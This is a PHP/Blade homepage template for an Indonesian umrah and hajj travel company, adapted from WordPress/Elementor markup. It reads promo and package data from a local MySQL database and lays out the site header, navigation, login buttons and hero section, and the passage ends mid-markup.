<?php
$koneksi = mysqli_connect("localhost","root","","crud8");
$get_textPromo = mysqli_fetch_array(mysqli_query($koneksi, "SELECT * FROM text_promo"));

$get_umrohReguler = mysqli_fetch_array(mysqli_query($koneksi, "SELECT * FROM package_dtt WHERE id=1"));
$get_umrohArbain = mysqli_fetch_array(mysqli_query($koneksi, "SELECT * FROM package_dtt WHERE id=2"));
$get_umrohPlusTurkiye = mysqli_fetch_array(mysqli_query($koneksi, "SELECT * FROM package_dtt WHERE id=3"));
$get_hajiFurodah = mysqli_fetch_array(mysqli_query($koneksi, "SELECT * FROM package_dtt WHERE id=4"));
?>



<!DOCTYPE html>
<html lang="en-US">
<head>

    {{-- untuk form penawaran user --}}
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    {{--<script src="https://cdn.tailwindcss.com"></script>--}}
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>


    <style>


    .elementor-7
    .elementor-element.elementor-element-6037b9e:not(.elementor-widget-image)
    .elementor-widget-container {
    -webkit-mask-image: url({{ asset('/wp-content/plugins/elementor/assets/mask-shapes/circle.svg')}});
    -webkit-mask-size: contain;
    -webkit-mask-position: center center;
    -webkit-mask-repeat: no-repeat;
    }
    .elementor-7
    .elementor-element.elementor-element-6037b9e.elementor-widget-image
    .elementor-widget-container
    img {
    -webkit-mask-image: url({{ asset('/wp-content/plugins/elementor/assets/mask-shapes/circle.svg') }});
    -webkit-mask-size: contain;
    -webkit-mask-position: center center;
    -webkit-mask-repeat: no-repeat;
    }
    </style>
    <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>

<script data-no-optimize="1">var litespeed_docref=sessionStorage.getItem("litespeed_docref");litespeed_docref&&(Object.defineProperty(document,"referrer",{get:function(){return litespeed_docref}}),sessionStorage.removeItem("litespeed_docref"));</script> <meta charset="UTF-8">
<link data-optimized="2" rel="stylesheet" href="{{ asset('/wp-content/litespeed/css/54734a6b5b5d509725724fcd005b0ed1.css?ver=ac3f9') }}">
<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
<title>Focus</title>
<link rel="canonical" href="https://armecawebdev.my.id/home/">
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Home - My Blog">
<meta property="og:description" content="Partner terbaik Perjalanan Umrah &#038; haji Mitra dari perusahaan ground handling umrah dan haji terbesar di Indonesia yang telah dipercaya lebih dari 50 biro perjalanan we have Integrity@@Excellence@@Collaboration@@Innovation Meningkatkan pelayanan dengan mengutamakan 7S (Senyum, Sapa, Salam, Sopan, Santun, Semangat, Sepenuh Hati)@@Memberikan pelayanan dengan cepat, tanggap, dan tepat@@Mengedepankan nilai etika dan profesionalisme dalam semua interaksi dengan jamaah dan mitra kerja@@Meningkatkan kualitas &hellip; Home Read More &raquo;">
<meta property="og:url" content="https://armecawebdev.my.id/home/">
<meta property="og:site_name" content="My Blog">
<meta property="article:modified_time" content="2023-10-12T15:25:50+00:00">
<meta property="og:image" content="{{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-1024x238.png') }}">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:label1" content="Est. reading time">
<meta name="twitter:data1" content="7 minutes"> <script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://armecawebdev.my.id/home/","url":"https://armecawebdev.my.id/home/","name":"Home - My Blog","isPartOf":{"@id":"https://armecawebdev.my.id/#website"},"primaryImageOfPage":{"@id":"https://armecawebdev.my.id/home/#primaryimage"},"image":{"@id":"https://armecawebdev.my.id/home/#primaryimage"},"thumbnailUrl":"{{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-1024x238.png') }}","datePublished":"2023-04-06T12:58:35+00:00","dateModified":"2023-10-12T15:25:50+00:00","breadcrumb":{"@id":"https://armecawebdev.my.id/home/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://armecawebdev.my.id/home/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://armecawebdev.my.id/home/#primaryimage","url":"{{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih.png') }}","contentUrl":"{{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih.png') }}","width":1821,"height":424},{"@type":"BreadcrumbList","@id":"https://armecawebdev.my.id/home/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://armecawebdev.my.id/"},{"@type":"ListItem","position":2,"name":"Home"}]},{"@type":"WebSite","@id":"https://armecawebdev.my.id/#website","url":"https://armecawebdev.my.id/","name":"My Blog","description":"My WordPress Blog","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://armecawebdev.my.id/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"}]}</script> <link rel="alternate" type="application/rss+xml" title="My Blog &raquo; Feed" href="https://armecawebdev.my.id/feed/">
<link rel="alternate" type="application/rss+xml" title="My Blog &raquo; Comments Feed" href="https://armecawebdev.my.id/comments/feed/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>

<link rel="alternate" type="application/json" href="https://armecawebdev.my.id/wp-json/wp/v2/pages/7">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://armecawebdev.my.id/xmlrpc.php?rsd">
<meta name="generator" content="WordPress 6.3.2">
<link rel="shortlink" href="https://armecawebdev.my.id/?p=7">
<link rel="alternate" type="application/json+oembed" href="https://armecawebdev.my.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Farmecawebdev.my.id%2Fhome%2F">
<link rel="alternate" type="text/xml+oembed" href="https://armecawebdev.my.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Farmecawebdev.my.id%2Fhome%2F&#038;format=xml">
<meta name="generator" content="Site Kit by Google 1.106.0">
<meta name="generator" content="Elementor 3.15.2; features: e_dom_optimization, e_optimized_assets_loading, e_optimized_css_loading, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-swap">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
</head>
<body class="page-template page-template-elementor_canvas page page-id-7 ehf-header ehf-template-astra ehf-stylesheet-astra ast-desktop ast-plain-container ast-no-sidebar astra-4.1.8 ast-single-post ast-inherit-site-logo-transparent ast-hfb-header ast-normal-title-enabled elementor-default elementor-template-canvas elementor-kit-6 elementor-page elementor-page-7">
    <header id="masthead" itemscope="itemscope" itemtype="https://schema.org/WPHeader" style="        position: fixed;
        top: 0;
        width: 100%;
        z-index: 90;
        background-color: white;">
        <p class="main-title bhf-hidden" itemprop="headline"><a href="#" title="My Blog" rel="home">My Blog</a></p>
<div data-elementor-type="wp-post" data-elementor-id="1421" class="elementor elementor-1421">
<section class="elementor-section elementor-top-section elementor-element elementor-element-5e978eaf elementor-section-content-middle envato-kit-141-top-0 elementor-hidden-mobile elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5e978eaf" data-element_type="section"><div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-504122cb" data-id="504122cb" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-7109d32 elementor-widget elementor-widget-site-logo" data-id="7109d32" data-element_type="widget" data-settings="{&quot;align&quot;:&quot;center&quot;,&quot;width&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;width_tablet&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;width_mobile&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;space&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;space_tablet&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;space_mobile&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;image_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;image_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;image_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_padding&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_padding_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_padding_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_space&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;caption_space_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;caption_space_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="site-logo.default"><div class="elementor-widget-container"><div class="hfe-site-logo">
<a data-elementor-open-lightbox="" class="elementor-clickable" href="#"><div class="hfe-site-logo-set"><div class="hfe-site-logo-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iODciIHZpZXdCb3g9IjAgMCAzMDAgODciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHN0eWxlPSJmaWxsOiNjZmQ0ZGI7ZmlsbC1vcGFjaXR5OiAwLjE7Ii8+PC9zdmc+" width="300" height="87" class="hfe-site-logo-img elementor-animation-" data-src="{{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-300x87.png')}}" alt="focus logo rec brown">
</div></div>
</a>
</div></div></div></div></div>
<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-2b4d422" data-id="2b4d422" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-de27754 e-flex e-con-boxed e-con" data-id="de27754" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-db658f1 e-transform e-transform elementor-widget elementor-widget-heading" data-id="db658f1" data-element_type="widget" data-settings="{&quot;_transform_scale_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><a href="{{route('homepage')}}" class="elementor-heading-title elementor-size-default">Home</a></div></div>
<div class="elementor-element elementor-element-30e277d e-transform e-transform elementor-widget elementor-widget-heading" data-id="30e277d" data-element_type="widget" data-settings="{&quot;_transform_scale_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><a href="#tentangne"  class="elementor-heading-title elementor-size-default">Tentang</a></div></div>
<div class="elementor-element elementor-element-74bdbdd e-transform e-transform elementor-widget elementor-widget-heading" data-id="74bdbdd" data-element_type="widget" data-settings="{&quot;_transform_scale_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><a href="#layanan" class="elementor-heading-title elementor-size-default">Layanan</a></div></div>
<div class="elementor-element elementor-element-7dceaab e-transform e-transform elementor-widget elementor-widget-heading" data-id="7dceaab" data-element_type="widget" data-settings="{&quot;_transform_scale_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><a href="#kenapa_fokus" class="elementor-heading-title elementor-size-default">Mengapa Focus</a></div></div>
<div class="elementor-element elementor-element-0e4a216 e-transform e-transform elementor-widget elementor-widget-heading" data-id="0e4a216" data-element_type="widget" data-settings="{&quot;_transform_scale_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><a href="#testimon" class="elementor-heading-title elementor-size-default">Testimoni</a></div></div>
<div class="elementor-element elementor-element-8312f20 e-transform e-transform elementor-widget elementor-widget-heading" data-id="8312f20" data-element_type="widget" data-settings="{&quot;_transform_scale_effect&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.2,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><a href="#galerie" class="elementor-heading-title elementor-size-default">Galeri</a></div></div>
</div></div></div></div>
<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-71b80c3a" data-id="71b80c3a" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><section class="elementor-section elementor-inner-section elementor-element elementor-element-4a92123e elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4a92123e" data-element_type="section"><div class="elementor-container elementor-column-gap-no"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-553d772b" data-id="553d772b" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-128f2d5a elementor-align-right elementor-widget elementor-widget-button" data-id="128f2d5a" data-element_type="widget" data-widget_type="button.default"><div class="elementor-widget-container"><div class="elementor-button-wrapper">
<a class="elementor-button elementor-button-link elementor-size-xs" href="{{route('login')}}">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-text">Login</span>
</span>
</a>
</div></div></div></div></div></div></section></div></div>
</div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-98ecf9c elementor-section-content-middle envato-kit-141-top-0 elementor-hidden-desktop elementor-hidden-tablet elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="98ecf9c" data-element_type="section"><div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-ad87566" data-id="ad87566" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-7f26309 elementor-widget elementor-widget-site-logo" data-id="7f26309" data-element_type="widget" data-settings="{&quot;align&quot;:&quot;center&quot;,&quot;width&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;width_tablet&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;width_mobile&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;space&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;space_tablet&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;space_mobile&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;image_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;image_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;image_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_padding&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_padding_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_padding_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;caption_space&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:0,&quot;sizes&quot;:[]},&quot;caption_space_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;caption_space_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="site-logo.default"><div class="elementor-widget-container"><div class="hfe-site-logo">
<a data-elementor-open-lightbox="" class="elementor-clickable" href="#"><div class="hfe-site-logo-set"><div class="hfe-site-logo-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iODciIHZpZXdCb3g9IjAgMCAzMDAgODciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHN0eWxlPSJmaWxsOiNjZmQ0ZGI7ZmlsbC1vcGFjaXR5OiAwLjE7Ii8+PC9zdmc+" width="300" height="87" class="hfe-site-logo-img elementor-animation-" data-src="{{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-300x87.png')}}" alt="focus logo rec brown">
</div></div>
</a>
</div></div></div></div></div>

<style>
    .centered-button {
        display: flex;
        align-items: center;
    }

    .centered-button .elementor-button-text {
        text-align: center;
    }
</style>
<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-a8411cf" data-id="a8411cf" data-element_type="column">
    <div class="elementor-widget-wrap elementor-element-populated">
        <div class="elementor-element elementor-element-897f8cb e-flex e-con-boxed e-con" data-id="897f8cb" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}">
            <div style="display: flex; justify-content: flex-end;">
                <a class="elementor-button elementor-button-link elementor-size-sm" href="http://dttproj.test/login" style="border-radius: 50px; background-color: #6B5E56; padding: 10px 20px;">
                    <span class="elementor-button-content-wrapper" style="text-align: center;">
                        <span class="elementor-button-text" style="color: white;">Login</span>
                    </span>
                </a>
            </div>
        </div>
    </div>
</div>



</div></section>
</div></header>
<style>


*,
*::before,
*::after {
  box-sizing: border-box;
}

.marquee {
  overflow: hidden;
  font-family: "Pridi", sans-serif;
  font-weight: 600;
  font-size: 34px;
  text-transform: uppercase;
  background-color: #FFDC00;
}

.marquee__inner {
  display: flex;
}

.marquee__line {
  flex-shrink: 0;
  margin: 0;
  padding: 10px 15px;
  min-width: 100%;
  white-space: nowrap;
  animation-name: marqueeLine;
  animation-duration: 5s;
  animation-timing-function: ease-in-out;
  animation-iteration-count: infinite;
}

@keyframes marqueeLine {
  from {
    transform: translateX(0);
  }

  to {
    transform: translateX(-100%);
  }
}

@media screen and (max-width: 768px) {
  .marquee__line {
    font-size: 24px;
    padding: 5px 10px;
  }
}

</style>
        <link href="https://fonts.googleapis.com/css?family=Pridi:600" rel="stylesheet">

<div class="marquee" style="margin-top:110px;">
    <div class="marquee__inner">
        <p class="marquee__line"><?php echo $get_textPromo[1]; ?></p>
        <p class="marquee__line"><?php echo $get_textPromo[1]; ?></p>
    </div>
</div>
<div data-elementor-type="wp-page" data-elementor-id="7" class="elementor elementor-7">
<section class="elementor-section elementor-top-section elementor-element elementor-element-4b739ffb elementor-section-content-middle elementor-reverse-mobile elementor-section-height-min-height elementor-section-full_width elementor-section-items-stretch elementor-section-height-default" data-id="4b739ffb" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;shape_divider_bottom&quot;:&quot;triangle-asymmetrical&quot;,&quot;shape_divider_bottom_negative&quot;:&quot;yes&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-shape elementor-shape-bottom" data-negative="true">
<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1000 100" preserveaspectratio="none">
<path class="elementor-shape-fill" d="M737.9,94.7L0,0v100h1000V0L737.9,94.7z"></path>
</svg>
</div>
<div class="elementor-container elementor-column-gap-wider">
<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-133af148" data-id="133af148" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated">
<section class="elementor-section elementor-inner-section elementor-element elementor-element-71556177 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="71556177" data-element_type="section"><div class="elementor-container elementor-column-gap-no"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-6269aa88" data-id="6269aa88" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-f20a6e3 animated-slow elementor-invisible elementor-widget elementor-widget-heading" data-id="f20a6e3" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:100,&quot;_animation_mobile&quot;:&quot;fadeIn&quot;}" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Partner terbaik</h2></div></div>
<div class="elementor-element elementor-element-60a6aa63 animated-slow elementor-invisible elementor-widget elementor-widget-heading" data-id="60a6aa63" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:399,&quot;_animation_mobile&quot;:&quot;fadeIn&quot;}" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Perjalanan <br> Umrah & haji</h2></div></div>
</div></div></div></section><div class="elementor-element elementor-element-1df85886 elementor-widget elementor-widget-text-editor" data-id="1df85886" data-element_type="widget" data-settings="{&quot;_animation_mobile&quot;:&quot;fadeIn&quot;}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Mitra dari perusahaan ground handling umrah dan haji terbesar di Indonesia yang telah dipercaya lebih dari 50 biro perjalanan</p></div></div>
<div class="elementor-element elementor-element-085d59a e-flex e-con-boxed e-con" data-id="085d59a" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner"><div class="elementor-element elementor-element-9d15e4e elementor-widget elementor-widget-image" data-id="9d15e4e" data-element_type="widget" data-settings="{&quot;_animation_mobile&quot;:&quot;fadeInUp&quot;}" data-widget_type="image.default"><div class="elementor-widget-container">
